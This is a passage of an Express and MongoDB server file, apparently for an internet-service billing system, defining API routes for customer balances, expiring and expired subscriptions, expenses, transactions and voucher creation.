          console.log(`🔒 STRICT: Filtering /api/balances by fee collector (case-insensitive): ${feeCollectorTrimmed}`);
        }
      }

      // STRICT: Filter by assignTo (technician) if provided (case-insensitive) - ALWAYS apply
      if (assignTo) {
        const assignToTrimmed = assignTo.trim();
        if (assignToTrimmed) {
          query.$and.push({ assignTo: { $regex: new RegExp(`^${assignToTrimmed}$`, 'i') } });
          console.log(`🔒 STRICT: Filtering /api/balances by assignTo (technician, case-insensitive): ${assignToTrimmed}`);
        }
      }
    }

    // Search filter - search by userName, simNo, whatsappNo, userId, streetName
    if (search || alphabet) {
      const searchTrimmed = (search || '').trim();
      const alphabetLetter = (alphabet || '').trim();

      if (alphabetLetter) {
        const alphabetRegex = new RegExp(`^${alphabetLetter}`, 'i');
        query.$and.push({ userName: alphabetRegex });
        console.log(`🔤 Filtering balance users by alphabet: "${alphabetLetter}"`);
      } else if (searchTrimmed) {
        const searchRegex = new RegExp(searchTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'i');
        query.$and.push({
          $or: [
            { userName: searchRegex },
            { simNo: searchRegex },
            { whatsappNo: searchRegex },
            { userId: searchRegex },
            { streetName: searchRegex }
          ]
        });
        console.log(`🔍 Searching balance users by: "${searchTrimmed}"`);
      }
    }

    // If expiry date filter is provided, check both vouchers and users collections
    if (expiryDate) {
      const parts = String(expiryDate).split(/[-\/]/);
      if (parts.length === 3) {
        let [dPart, mPart, yPart] = parts;
        // If first part is YYYY, it's ISO, swap back to get day/month/year
        if (dPart.length === 4) { [yPart, mPart, dPart] = [dPart, mPart, yPart]; }

        const dateWithHyphen = `${dPart.padStart(2, '0')}-${mPart.padStart(2, '0')}-${yPart}`;
        const dateWithSlash = `${dPart.padStart(2, '0')}/${mPart.padStart(2, '0')}/${yPart}`;
        const isoFormat = expiryDate; // YYYY-MM-DD
        console.log(`📅 Balance users date filter: ${expiryDate} → formats: ${dateWithHyphen}, ${dateWithSlash}, ${isoFormat}`);

        // Find vouchers with matching expiry date
        const vouchers = await vouchersCollection.find({
          expiryDate: { $in: [dateWithHyphen, dateWithSlash, isoFormat] }
        }).toArray();

        const userIdsFromVouchers = vouchers.map(v => v.userId);
        console.log(`📋 Found ${userIdsFromVouchers.length} vouchers with expiry date ${expiryDate}`);

        // Also check users collection for expiryDate field directly
        if (userIdsFromVouchers.length > 0) {
          query.$and.push({
            $or: [
              { _id: { $in: userIdsFromVouchers.map(id => new ObjectId(id)) } },
              { expiryDate: { $in: [dateWithHyphen, dateWithSlash, isoFormat] } }
            ]
          });
        } else {
          // No vouchers found, but check users collection directly
          query.$and.push({
            expiryDate: { $in: [dateWithHyphen, dateWithSlash, isoFormat] }
          });
        }

        console.log(`🔍 Balance Query with date filter:`, JSON.stringify(query, null, 2));
      }
    }

    const totalCount = await usersCollection.countDocuments(query);
    const users = await usersCollection
      .find(query)
      .sort({ userName: 1 })
      .skip((page - 1) * limit)
      .limit(limit)
      .toArray();

    console.log(`Balance users: ${users.length} found, ${totalCount} total`);

    res.status(200).json({
      success: true,
      data: users,
      totalCount,
      page,
      limit
    });
  } catch (error) {
    console.error('Error fetching balance users:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching balance users',
      error: error.message
    });
  }
});

// GET expiring soon users
// Supports optional ?date=YYYY-MM-DD (calendar day in PKT). If absent, defaults to TOMORROW.
app.get('/api/users/expiring-soon', async (req, res) => {
  try {
    const usersCollection = db.collection('users');
    // Use PKT (UTC+05:00) day math so the calendar day uses your timezone
    const nowUTC = new Date();
    const nowInPKT = new Date(nowUTC.getTime() + PKT_OFFSET_MIN * 60000);
    const todayY = nowInPKT.getUTCFullYear();
    const todayM = nowInPKT.getUTCMonth();
    const todayD = nowInPKT.getUTCDate();

    // If specific date is requested, filter by that date
    const dateParam = req.query.date; // YYYY-MM-DD
    const feeCollector = req.query.feeCollector; // Fee collector name filter
    let targetY, targetM, targetD;
    let filterByDate = false;

    if (dateParam && /^\d{4}-\d{2}-\d{2}$/.test(String(dateParam))) {
      filterByDate = true;
      const [yyyy, mm, dd] = String(dateParam).split('-');
      targetY = parseInt(yyyy, 10);
      targetM = parseInt(mm, 10) - 1; // JS months 0-based
      targetD = parseInt(dd, 10);

      // Guard: if target day is BEFORE today's PKT day, return no results (don't show past dates)
      const isBeforeToday =
        (targetY < todayY) ||
        (targetY === todayY && (targetM < todayM || (targetM === todayM && targetD < todayD)));

      if (isBeforeToday) {
        return res.status(200).json({
          success: true,
          count: 0,
          data: []
        });
      }
    }

    // Fetch users based on whether specific date is requested
    // If date is provided: fetch ALL active users (we'll filter by date later)
    // If no date: only fetch users marked by cron job with showInExpiringSoon flag
    // CRITICAL: Include ALL statuses for Expiring Soon (paid, unpaid, partial, pending, superbalance)
    // This is a REMINDER list - users should see who's expiring tomorrow regardless of payment status
    const query = {
      status: { $in: ['paid', 'partial', 'unpaid', 'pending', 'superbalance'] },
      $or: [
        { serviceStatus: { $ne: 'inactive' } },
        { serviceStatus: { $exists: false } }
      ]
    };

    // Only filter by showInExpiringSoon flag when no specific date is requested
    if (!filterByDate) {
      query.showInExpiringSoon = true;
    }

    // STRICT: Filter by fee collector if provided (case-insensitive) - ALWAYS apply
    if (feeCollector) {
      const feeCollectorTrimmed = feeCollector.trim();
      if (feeCollectorTrimmed) {
        query.feeCollector = { $regex: new RegExp(`^${feeCollectorTrimmed}$`, 'i') };
        console.log(`🔒 STRICT: Filtering /api/users/expiring-soon by fee collector (case-insensitive): ${feeCollectorTrimmed}`);
      }
    }

    // STRICT: Filter by assignTo (technician) if provided (case-insensitive) - ALWAYS apply
    const assignTo = req.query.assignTo; // Technician assignment filter
    if (assignTo) {
      const assignToTrimmed = assignTo.trim();
      if (assignToTrimmed) {
        query.assignTo = { $regex: new RegExp(`^${assignToTrimmed}$`, 'i') };
        console.log(`🔒 STRICT: Filtering /api/users/expiring-soon by assignTo (technician, case-insensitive): ${assignToTrimmed}`);
      }
    }

    // Implement search filter (DB-side)
    const search = req.query.search;
    if (search) {
      const searchRegex = new RegExp(search.trim(), 'i');
      const searchFilter = {
        $or: [
          { userName: searchRegex },
          { userId: searchRegex },
          { simNo: searchRegex },
          { streetName: searchRegex }
        ]
      };

      // Since the query already has an $or for serviceStatus, wrap both in $and
      if (query.$or) {
        const existingOr = query.$or;
        delete query.$or;
        query.$and = [
          { $or: existingOr },
          searchFilter
        ];
      } else {
        query.$and = query.$and || [];
        query.$and.push(searchFilter);
      }
      console.log(`🔍 DB Search: Filtering expiring users for: "${search}"`);
    }

    const usersAll = await usersCollection.find(query).toArray();

    // Helper: parse expiryDate to PKT Y/M/D (supports DD-MM-YYYY and DD/MM/YYYY, and ISO fallback)
    const toPKT_YMD = (dateObj) => {
      const pkt = new Date(dateObj.getTime() + PKT_OFFSET_MIN * 60000);
      return { y: pkt.getUTCFullYear(), m: pkt.getUTCMonth(), d: pkt.getUTCDate() };
    };
    const parseExpiryYMD = (exp) => {
      if (!exp) return null;
      if (exp instanceof Date) return toPKT_YMD(exp);
      if (typeof exp === 'string') {
        const m1 = exp.match(/^(\d{1,2})[\/-](\d{1,2})[\/-](\d{4})$/); // DD-MM-YYYY or DD/MM/YYYY
        if (m1) {
          const d = parseInt(m1[1], 10);
          const m = parseInt(m1[2], 10) - 1;
          const y = parseInt(m1[3], 10);
          const dt = new Date(Date.UTC(y, m, d));
          return toPKT_YMD(dt);
        }
        const m2 = exp.match(/^(\d{4})-(\d{2})-(\d{2})/); // ISO-like
        if (m2) {
          const y = parseInt(m2[1], 10);
          const m = parseInt(m2[2], 10) - 1;
          const d = parseInt(m2[3], 10);
          const dt = new Date(Date.UTC(y, m, d));
          return toPKT_YMD(dt);
        }
        const d2 = new Date(exp);
        if (!isNaN(d2.getTime())) return toPKT_YMD(d2);
        return null;
      }
      return null;
    };

    const mapped = usersAll.map(u => ({ u, ymd: parseExpiryYMD(u.expiryDate) }));

    // Filter by date only if date parameter was provided
    let filtered;
    if (filterByDate) {
      // Specific date requested - filter by that date
      filtered = mapped.filter(({ ymd }) => ymd && ymd.y === targetY && ymd.m === targetM && ymd.d === targetD);
    } else {
      // No date parameter - show users expiring within next 2 days (today and tomorrow)
      // This prevents showing users with incorrectly set flags
      const tomorrowInPKT = new Date(Date.UTC(todayY, todayM, todayD) + 24 * 60 * 60 * 1000);
      const tomorrowY = tomorrowInPKT.getUTCFullYear();
      const tomorrowM = tomorrowInPKT.getUTCMonth();
      const tomorrowD = tomorrowInPKT.getUTCDate();

      filtered = mapped.filter(({ ymd }) => {
        if (!ymd) return false;
        // Show users expiring TODAY or TOMORROW (within next 2 days)
        // TODAY: Users whose expiry is today (will be processed at 12 PM)
        // TOMORROW: Users whose expiry is tomorrow (reminder for next day)
        const isToday = (ymd.y === todayY && ymd.m === todayM && ymd.d === todayD);
        const isTomorrow = (ymd.y === tomorrowY && ymd.m === tomorrowM && ymd.d === tomorrowD);
        return isToday || isTomorrow;
      });
    }

    const sorted = filtered.sort((a, b) => {
      // Sort by userName A-Z
      const nameA = (a.u.userName || '').toLowerCase();
      const nameB = (b.u.userName || '').toLowerCase();
      return nameA.localeCompare(nameB);
    });

    // Calculate days left using PKT midnights
    const MS_PER_DAY = 24 * 60 * 60 * 1000;
    const todayPKTMidUTC = Date.UTC(todayY, todayM, todayD) - PKT_OFFSET_MIN * 60000;
    const usersWithDaysLeft = sorted.map(({ u, ymd }) => {
      const expPKTMidUTC = Date.UTC(ymd.y, ymd.m, ymd.d) - PKT_OFFSET_MIN * 60000;
      const daysLeft = Math.round((expPKTMidUTC - todayPKTMidUTC) / MS_PER_DAY);
      const expAsDate = new Date(Date.UTC(ymd.y, ymd.m, ymd.d));
      return { ...u, expiryDate: expAsDate.toISOString(), daysLeft };
    });

    res.status(200).json({
      success: true,
      count: usersWithDaysLeft.length,
      data: usersWithDaysLeft
    });
  } catch (error) {
    console.error('Error fetching expiring users:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching expiring users',
      error: error.message
    });
  }
});

// GET deactivated users
app.get('/api/users/deactivated', async (req, res) => {
  try {
    const usersCollection = db.collection('users');
    const users = await usersCollection.find({
      status: 'inactive'
    }).sort({ deactivatedDate: -1 }).toArray();

    res.status(200).json({
      success: true,
      count: users.length,
      data: users
    });
  } catch (error) {
    console.error('Error fetching deactivated users:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching deactivated users',
      error: error.message
    });
  }
});

// GET user transactions by user ID
app.get('/api/transactions/:userId', ensureDbConnection, async (req, res) => {
  try {
    const { userId } = req.params;

    // Find all vouchers for this user (paid, partial, or unpaid)
    const vouchers = await vouchersCollection.find({
      userId: userId
    }).sort({ date: -1 }).toArray();

    // Transform vouchers to transaction format
    const transactions = vouchers.map(voucher => ({
      _id: voucher._id,
      date: voucher.date || voucher.createdAt || voucher.paymentDate,
      amount: voucher.paidAmount || voucher.packageFee || 0,
      month: voucher.month || new Date(voucher.date || voucher.createdAt).toLocaleDateString('en-US', { month: 'long', year: 'numeric' }),
      paymentMethod: voucher.paymentMethod || 'Cash',
      status: voucher.status || 'unpaid'
    }));

    res.status(200).json({
      success: true,
      count: transactions.length,
      data: transactions
    });
  } catch (error) {
    console.error('Error fetching user transactions:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching user transactions',
      error: error.message
    });
  }
});

// GET income transactions
app.get('/api/transactions/income', async (req, res) => {
  try {
    const transactionsCollection = db.collection('transactions');
    const transactions = await transactionsCollection.find({
      type: 'income'
    }).sort({ paymentDate: -1 }).toArray();

    res.status(200).json({
      success: true,
      count: transactions.length,
      data: transactions
    });
  } catch (error) {
    console.error('Error fetching income:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching income',
      error: error.message
    });
  }
});

// GET all expenses
app.get('/api/expense', ensureDbConnection, async (req, res) => {
  try {
    const expensesCollection = db.collection('expenses');
    const expenses = await expensesCollection.find({}).sort({ date: -1 }).toArray();

    res.status(200).json({
      success: true,
      data: expenses
    });
  } catch (error) {
    console.error('Error fetching expenses:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching expenses',
      error: error.message
    });
  }
});

// GET expenses by date range
app.get('/api/expense/by-date-range', ensureDbConnection, async (req, res) => {
  try {
    const { fromDate, toDate } = req.query;

    if (!fromDate || !toDate) {
      return res.status(400).json({
        success: false,
        message: 'fromDate and toDate are required (format: YYYY-MM-DD)'
      });
    }

    const expensesCollection = db.collection('expenses');

    // Parse dates and set time to start/end of day for proper range filtering
    const from = new Date(fromDate);
    from.setHours(0, 0, 0, 0);

    const to = new Date(toDate);
    to.setHours(23, 59, 59, 999);

    console.log(`📅 Fetching expenses from ${fromDate} to ${toDate}`);

    const expenses = await expensesCollection.find({
      date: {
        $gte: from,
        $lte: to
      }
    }).sort({ date: -1 }).toArray();

    // Calculate total expense
    const totalExpense = expenses.reduce((sum, expense) => sum + (expense.amount || 0), 0);

    res.status(200).json({
      success: true,
      count: expenses.length,
      totalExpense: totalExpense,
      data: expenses
    });
  } catch (error) {
    console.error('Error fetching expenses by date range:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching expenses by date range',
      error: error.message
    });
  }
});

// GET expenses grouped by month
app.get('/api/expense/by-month', ensureDbConnection, async (req, res) => {
  try {
    const expensesCollection = db.collection('expenses');
    const paidBy = req.query.paidBy; // Fee collector name filter

    // Build query with paidBy filter if provided
    const query = {};
    if (paidBy) {
      query.paidBy = { $regex: new RegExp(`^${paidBy.trim().replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') };
      console.log(`💰 Expense by month - filtering by paidBy: ${paidBy}`);
    }

    const expenses = await expensesCollection.find(query).sort({ date: -1 }).toArray();
    console.log(`💰 Expense by month - found ${expenses.length} expenses${paidBy ? ` for ${paidBy}` : ''}`);

    // Group expenses by month
    const expensesByMonth = {};

    expenses.forEach(expense => {
      const date = new Date(expense.date);
      // Format as "Month YYYY" (e.g., "November 2025")
      const monthYear = date.toLocaleDateString('en-US', {
        year: 'numeric',
        month: 'long'
      });

      if (!expensesByMonth[monthYear]) {
        expensesByMonth[monthYear] = {
          month: monthYear,
          expenses: [],
          totalAmount: 0,
          count: 0
        };
      }

      expensesByMonth[monthYear].expenses.push(expense);
      expensesByMonth[monthYear].totalAmount += expense.amount;
      expensesByMonth[monthYear].count += 1;
    });

    // Convert to array and sort by most recent month
    const monthsArray = Object.values(expensesByMonth).sort((a, b) => {
      const dateA = new Date(a.month);
      const dateB = new Date(b.month);
      return dateB.getTime() - dateA.getTime();
    });

    // Always include current month if not present
    const currentDate = new Date();
    const currentMonth = currentDate.toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'long'
    });

    if (!expensesByMonth[currentMonth]) {
      monthsArray.unshift({
        month: currentMonth,
        expenses: [],
        totalAmount: 0,
        count: 0
      });
    }

    res.status(200).json({
      success: true,
      data: monthsArray
    });
  } catch (error) {
    console.error('Error fetching expenses by month:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching expenses by month',
      error: error.message
    });
  }
});

// GET expenses for a specific month
app.get('/api/expense/:month', ensureDbConnection, async (req, res) => {
  try {
    const { month } = req.params;
    const paidBy = req.query.paidBy; // Fee collector name filter

    if (!month) {
      return res.status(400).json({
        success: false,
        message: 'Month parameter is required'
      });
    }

    const expensesCollection = db.collection('expenses');

    // Build query with paidBy filter if provided
    const query = {};
    if (paidBy) {
      query.paidBy = { $regex: new RegExp(`^${paidBy.trim().replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') };
      console.log(`💰 Expense for month ${month} - filtering by paidBy: ${paidBy}`);
    }

    const allExpenses = await expensesCollection.find(query).toArray();
    console.log(`💰 Found ${allExpenses.length} expenses${paidBy ? ` for ${paidBy}` : ''}`);

    // Filter expenses for the specified month
    const filteredExpenses = allExpenses.filter(expense => {
      const date = new Date(expense.date);
      const expenseMonth = date.toLocaleDateString('en-US', {
        year: 'numeric',
        month: 'long'
      });
      return expenseMonth === month;
    });

    res.status(200).json({
      success: true,
      data: filteredExpenses,
      month
    });
  } catch (error) {
    console.error('Error fetching expenses by month:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching expenses by month',
      error: error.message
    });
  }
});

// DEBUG endpoint to check collections
app.get('/api/debug/collections', ensureDbConnection, async (req, res) => {
  try {
    const collections = await db.listCollections().toArray();
    const collectionNames = collections.map(c => c.name);

    // Check expenses collection specifically
    const expensesExists = collectionNames.includes('expenses');
    let expenseCount = 0;
    let sampleExpense = null;

    if (expensesExists) {
      expenseCount = await db.collection('expenses').countDocuments();
      sampleExpense = await db.collection('expenses').findOne({});
    }

    res.status(200).json({
      success: true,
      database: db.databaseName,
      allCollections: collectionNames,
      expensesCollection: {
        exists: expensesExists,
        initialized: !!expensesCollection,
        count: expenseCount,
        sampleData: sampleExpense
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// POST add new expense
app.post('/api/transactions/expense', ensureDbConnection, async (req, res) => {
  try {
    const { amount, description, category, paidTo, paidBy, date } = req.body;

    // Validate required fields
    if (!amount || !description || !category) {
      return res.status(400).json({
        success: false,
        message: 'Amount, description, and category are required'
      });
    }

    // Create expense object
    const expense = {
      amount: parseFloat(amount),
      description,
      category,
      paidTo: paidTo || 'N/A',
      paidBy: paidBy || 'Admin', // Default to Admin if not provided
      date: date ? new Date(date) : new Date(),
      createdAt: new Date()
    };

    // Insert into expenses collection
    const result = await expensesCollection.insertOne(expense);

    // Get the created expense
    const createdExpense = await expensesCollection.findOne({ _id: result.insertedId });

    // Also create a transaction record for consistency
    try {
      const transactionsCollection = db.collection('transactions');
      await transactionsCollection.insertOne({
        amount: expense.amount,
        description: expense.description,
        type: 'expense',
        category: expense.category,
        paidTo: expense.paidTo,
        paidBy: expense.paidBy,
        paymentDate: expense.date,
        createdAt: expense.createdAt
      });
    } catch (transactionError) {
      console.log('⚠️ Could not create transaction record for expense:', transactionError);
      // Continue even if transaction record fails
    }

    console.log('✅ Expense added:', createdExpense);

    res.status(201).json({
      success: true,
      message: 'Expense added successfully',
      data: createdExpense
    });
  } catch (error) {
    console.error('❌ Error adding expense:', error);
    res.status(500).json({
      success: false,
      message: 'Error adding expense',
      error: error.message
    });
  }
});

// UPDATE expense by ID
app.put('/api/transactions/expense/:id', ensureDbConnection, async (req, res) => {
  try {
    const { id } = req.params;
    const { amount, description, category, paidTo, paidBy, date } = req.body;

    if (!ObjectId.isValid(id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid expense ID'
      });
    }

    const expensesCollection = db.collection('expenses');

    // Build update object
    const updateFields = {};
    if (amount !== undefined) updateFields.amount = parseFloat(amount);
    if (description !== undefined) updateFields.description = description;
    if (category !== undefined) updateFields.category = category;
    if (paidTo !== undefined) updateFields.paidTo = paidTo;
    if (paidBy !== undefined) updateFields.paidBy = paidBy;
    if (date !== undefined) updateFields.date = new Date(date);

    const result = await expensesCollection.findOneAndUpdate(
      { _id: new ObjectId(id) },
      { $set: updateFields },
      { returnDocument: 'after' }
    );

    if (!result) {
      return res.status(404).json({
        success: false,
        message: 'Expense not found'
      });
    }

    try {
      const transactionsCollection = db.collection('transactions');
      await transactionsCollection.updateOne(
        {
          type: 'expense',
          description: result.description // Best effort match
        },
        {
          $set: {
            amount: result.amount,
            description: result.description,
            category: result.category,
            paidTo: result.paidTo,
            paidBy: result.paidBy,
            paymentDate: result.date
          }
        }
      );
    } catch (transactionError) {
      console.log('⚠️ Could not update transaction record for expense:', transactionError);
    }

    console.log('✅ Expense updated:', result);

    res.status(200).json({
      success: true,
      message: 'Expense updated successfully',
      data: result
    });
  } catch (error) {
    console.error('❌ Error updating expense:', error);
    res.status(500).json({
      success: false,
      message: 'Error updating expense',
      error: error.message
    });
  }
});

// DELETE expense by ID
app.delete('/api/transactions/expense/:id', ensureDbConnection, async (req, res) => {
  try {
    const { id } = req.params;

    if (!ObjectId.isValid(id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid expense ID'
      });
    }

    const result = await expensesCollection.deleteOne({ _id: new ObjectId(id) });

    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Expense not found'
      });
    }

    console.log('✅ Expense deleted:', id);

    res.status(200).json({
      success: true,
      message: 'Expense deleted successfully'
    });
  } catch (error) {
    console.error('❌ Error deleting expense:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting expense',
      error: error.message
    });
  }
});

// ============ EMPLOYEE EXPENSE API ROUTES ============

// GET employee expenses grouped by month
app.get('/api/employee-expense/by-month', ensureDbConnection, async (req, res) => {
  try {
    const employeeExpenseCollection = db.collection('employee_expense');
    const paidBy = req.query.paidBy; // Fee collector name filter

    // Build query with paidBy filter if provided
    const query = {};
    if (paidBy) {
      query.paidBy = { $regex: new RegExp(`^${paidBy.trim().replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') };
      console.log(`💰 Employee expense by month - filtering by paidBy: ${paidBy}`);
    }

    const expenses = await employeeExpenseCollection.find(query).sort({ date: -1 }).toArray();
    console.log(`💰 Employee expense by month - found ${expenses.length} expenses${paidBy ? ` for ${paidBy}` : ''}`);

    // Group expenses by month
    const expensesByMonth = {};

    expenses.forEach(expense => {
      const date = new Date(expense.date);
      // Format as "Month YYYY" (e.g., "November 2025")
      const monthYear = date.toLocaleDateString('en-US', {
        year: 'numeric',
        month: 'long'
      });

      if (!expensesByMonth[monthYear]) {
        expensesByMonth[monthYear] = {
          month: monthYear,
          expenses: [],
          totalAmount: 0,
          count: 0
        };
      }

      expensesByMonth[monthYear].expenses.push(expense);
      expensesByMonth[monthYear].totalAmount += expense.amount;
      expensesByMonth[monthYear].count += 1;
    });

    // Convert to array and sort by most recent month
    const monthsArray = Object.values(expensesByMonth).sort((a, b) => {
      const dateA = new Date(a.month);
      const dateB = new Date(b.month);
      return dateB.getTime() - dateA.getTime();
    });

    // Always include current month if not present
    const currentDate = new Date();
    const currentMonth = currentDate.toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'long'
    });

    if (!expensesByMonth[currentMonth]) {
      monthsArray.unshift({
        month: currentMonth,
        expenses: [],
        totalAmount: 0,
        count: 0
      });
    }

    res.status(200).json({
      success: true,
      data: monthsArray
    });
  } catch (error) {
    console.error('Error fetching employee expenses by month:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching employee expenses by month',
      error: error.message
    });
  }
});

// GET employee expenses for a specific month
app.get('/api/employee-expense/:month', ensureDbConnection, async (req, res) => {
  try {
    const { month } = req.params;
    const paidBy = req.query.paidBy; // Fee collector name filter

    if (!month) {
      return res.status(400).json({
        success: false,
        message: 'Month parameter is required'
      });
    }

    const employeeExpenseCollection = db.collection('employee_expense');

    // Build query with paidBy filter if provided
    const query = {};
    if (paidBy) {
      query.paidBy = { $regex: new RegExp(`^${paidBy.trim().replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') };
      console.log(`💰 Employee expense for month ${month} - filtering by paidBy: ${paidBy}`);
    }

    const allExpenses = await employeeExpenseCollection.find(query).toArray();
    console.log(`💰 Found ${allExpenses.length} employee expenses${paidBy ? ` for ${paidBy}` : ''}`);

    // Filter expenses for the specified month
    const filteredExpenses = allExpenses.filter(expense => {
      const date = new Date(expense.date);
      const expenseMonth = date.toLocaleDateString('en-US', {
        year: 'numeric',
        month: 'long'
      });
      return expenseMonth === month;
    });

    res.status(200).json({
      success: true,
      data: filteredExpenses,
      month
    });
  } catch (error) {
    console.error('Error fetching employee expenses by month:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching employee expenses by month',
      error: error.message
    });
  }
});

// POST add new employee expense
app.post('/api/employee-expense', ensureDbConnection, async (req, res) => {
  try {
    const { amount, description, userName, paidTo, paidBy, date } = req.body;

    // Validate required fields
    if (!amount || !description || !userName) {
      return res.status(400).json({
        success: false,
        message: 'Amount, description, and user name are required'
      });
    }

    // Create expense object
    const expense = {
      amount: parseFloat(amount),
      description,
      category: 'General',
      userName: userName.trim(),
      paidTo: paidTo || 'N/A',
      paidBy: paidBy || 'Admin', // Default to Admin if not provided
      date: date ? new Date(date) : new Date(),
      createdAt: new Date()
    };

    // Insert into employee_expense collection
    const employeeExpenseCollection = db.collection('employee_expense');
    const result = await employeeExpenseCollection.insertOne(expense);

    // Get the created expense
    const createdExpense = await employeeExpenseCollection.findOne({ _id: result.insertedId });

    console.log('✅ Employee expense added:', createdExpense);

    res.status(201).json({
      success: true,
      message: 'Employee expense added successfully',
      data: createdExpense
    });
  } catch (error) {
    console.error('❌ Error adding employee expense:', error);
    res.status(500).json({
      success: false,
      message: 'Error adding employee expense',
      error: error.message
    });
  }
});

// DELETE employee expense by ID
app.delete('/api/employee-expense/:id', ensureDbConnection, async (req, res) => {
  try {
    const { id } = req.params;

    if (!ObjectId.isValid(id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid employee expense ID'
      });
    }

    const employeeExpenseCollection = db.collection('employee_expense');
    const result = await employeeExpenseCollection.deleteOne({ _id: new ObjectId(id) });

    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Employee expense not found'
      });
    }

    res.status(200).json({
      success: true,
      message: 'Employee expense deleted successfully'
    });
  } catch (error) {
    console.error('❌ Error deleting employee expense:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting employee expense',
      error: error.message
    });
  }
});

// GET outstanding users
app.get('/api/users/outstanding', async (req, res) => {
  try {
    const usersCollection = db.collection('users');
    const users = await usersCollection.find({
      expiryDate: { $lt: new Date() }
    }).sort({ expiryDate: 1 }).toArray();

    // Calculate months overdue and total outstanding
    const now = new Date();
    const usersWithOutstanding = users.map(user => {
      const monthsOverdue = Math.floor((now - new Date(user.expiryDate)) / (1000 * 60 * 60 * 24 * 30));
      return {
        ...user,
        monthsOverdue: monthsOverdue > 0 ? monthsOverdue : 1,
        totalOutstanding: (user.amount || 0) * (monthsOverdue > 0 ? monthsOverdue : 1)
      };
    });

    res.status(200).json({
      success: true,
      count: users.length,
      data: usersWithOutstanding
    });
  } catch (error) {
    console.error('Error fetching outstanding:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching outstanding',
      error: error.message
    });
  }
});

// GET expired users (users whose expiry date has passed)
app.get('/api/users/expired', async (req, res) => {
  try {
    const usersCollection = db.collection('users');
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    // Find users whose expiry date has passed and are not inactive
    const users = await usersCollection.find({
      expiryDate: { $lt: today.toISOString() },
      serviceStatus: { $ne: 'inactive' }
    }).sort({ expiryDate: -1 }).toArray();

    // Add additional information for display
    const expiredUsers = users.map(user => {
      const expiryDate = new Date(user.expiryDate);
      const daysPassed = Math.ceil((today - expiryDate) / (1000 * 60 * 60 * 24));
      return {
        ...user,
        daysPassed,
        expiryDateFormatted: expiryDate.toLocaleDateString('en-US', { day: 'numeric', month: 'long', year: 'numeric' })
      };
    });

    res.status(200).json({
      success: true,
      count: expiredUsers.length,
      data: expiredUsers
    });
  } catch (error) {
    console.error('Error fetching expired users:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching expired users',
      error: error.message
    });
  }
});

// GET route to fetch a single user by ID (must be after specific routes)
app.get('/api/users/:id', async (req, res) => {
  try {
    // Validate ObjectId format
    if (!ObjectId.isValid(req.params.id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid user ID format'
      });
    }

    const user = await usersCollection.findOne({ _id: new ObjectId(req.params.id) });
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }
    res.status(200).json({
      success: true,
      data: user
    });
  } catch (error) {
    console.error('Error fetching user:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching user',
      error: error.message
    });
  }
});

// POST create voucher (save to vouchers collection)
app.post('/api/vouchers', async (req, res) => {
  try {
    const vouchersCollection = db.collection('vouchers');

    const {
      userId,
      userName,
      rechargeDate,
      expiryDate,
      months,  // NEW: Support for months array
      packageFee,
      discount,
      paidAmount,
      remainingAmount,
      paymentMethod,
      receivedBy,
      paymentType,
      status,
      month,
      date,
      description
    } = req.body;

    // NEW: If months array is provided, create voucher with months array structure
    if (months && Array.isArray(months) && months.length > 0) {
      console.log(`📦 Creating voucher with ${months.length} months array for user ${userName}`);

      // Debug: Log receivedBy for first month
      if (months[0]) {
        console.log(`🔍 First month receivedBy check:`, {
          month: months[0].month,
          receivedBy: months[0].receivedBy,
          hasPaymentHistory: !!months[0].paymentHistory,
          paymentHistoryLength: months[0].paymentHistory?.length || 0
        });
      }

      // CRITICAL: Sort months by date (FIFO - First In First Out) before storing
      // This ensures months are always stored in chronological order (earliest first)
      // Payment distribution should apply to earliest months first (e.g., Oct before Nov)
      const parseDate = (dateStr) => {
        if (!dateStr) return new Date(0);
        if (dateStr instanceof Date) return dateStr;
        if (typeof dateStr === 'string') {
          // Check if ISO format (YYYY-MM-DD or full ISO string)
          if (/^\d{4}-\d{2}-\d{2}/.test(dateStr)) {
            // ISO format: YYYY-MM-DD or YYYY-MM-DDTHH:mm:ss.sssZ
            const parsed = new Date(dateStr);
            if (!isNaN(parsed.getTime())) return parsed;
          }

          // Try DD-MM-YYYY or DD/MM/YYYY format
          const parts = dateStr.split(/[-\/]/);
          if (parts.length === 3 && parts[2].length === 4) {
            // Check if year is 4 digits
            const day = parseInt(parts[0], 10);
            const month = parseInt(parts[1], 10) - 1;
            const year = parseInt(parts[2], 10);
            if (!isNaN(day) && !isNaN(month) && !isNaN(year)) {
              return new Date(year, month, day);
            }
          }

          // Fallback to standard Date parsing
          const parsed = new Date(dateStr);
          return isNaN(parsed.getTime()) ? new Date(0) : parsed;
        }
        return new Date(0);
      };

      const sortedMonths = [...months].sort((a, b) => {
        const dateA = parseDate(a.date || a.createdAt);
        const dateB = parseDate(b.date || b.createdAt);
